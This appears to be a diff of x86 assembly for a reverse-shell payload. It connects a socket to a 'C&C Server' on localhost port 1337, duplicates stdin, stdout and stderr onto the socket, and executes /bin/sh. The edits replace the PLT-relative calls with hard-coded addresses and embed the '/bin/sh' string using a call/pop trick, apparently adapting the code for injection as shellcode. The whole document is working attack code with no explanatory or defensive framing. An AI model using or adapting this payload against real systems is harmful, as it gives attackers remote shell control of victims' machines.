@@ -1,10 +1,10 @@
 # Connect to C&C Server on localhost aka 127.0.0.1 and on port 1337
-add    ebx,0x2e20
 sub    esp,0x4
 push   0x0
 push   0x1
 push   0x2
-call   1060 # <socket@plt>
+mov ebx, 0x08048730 
+call   ebx # <socket@plt>
 add    esp,0x10
 mov    DWORD PTR [ebp-0xc],eax
 mov    DWORD PTR [ebp-0x1c],0x0
@@ -19,30 +19,37 @@ push   0x10
 lea    eax,[ebp-0x1c]
 push   eax
 push   DWORD PTR [ebp-0xc]
-call   1070 # <connect@plt>
+mov ebx, 0x08048750 
+call   ebx # <connect@plt>
 add    esp,0x10
 # Redirect STDIN to the socket
 sub    esp,0x8
 push   0x0
 push   DWORD PTR [ebp-0xc]
-call   1030 # <dup2@plt>
+mov ebx, 0x08048600
+call   ebx # <dup2@plt>
 add    esp,0x10
 # Redirect STDOUT to the socket
 sub    esp,0x8
 push   0x1
 push   DWORD PTR [ebp-0xc]
-call   1030 # <dup2@plt>
+mov ebx, 0x08048600
+call   ebx # <dup2@plt>
 add    esp,0x10
 # Redirect STDERR to the socket
 sub    esp,0x8
 push   0x2
 push   DWORD PTR [ebp-0xc]
-call   1030 # <dup2@plt>
+mov ebx, 0x08048600 
+call   ebx # <dup2@plt>
 add    esp,0x10
 # Execute /bin/sh
-sub    esp,0x8
-push   0x0
-lea    eax,[ebx-0x1ff8]
-push   eax
-call   1050 # <execv@plt>
-add    esp,0x10
+call execute_bin_sh
+get_bin_sh:
+.STRING "/bin/sh"
+execute_bin_sh:
+pop ebx
+push 0x00
+push ebx
+mov ebx, 0x080486d0
+call   ebx # <execv@plt>
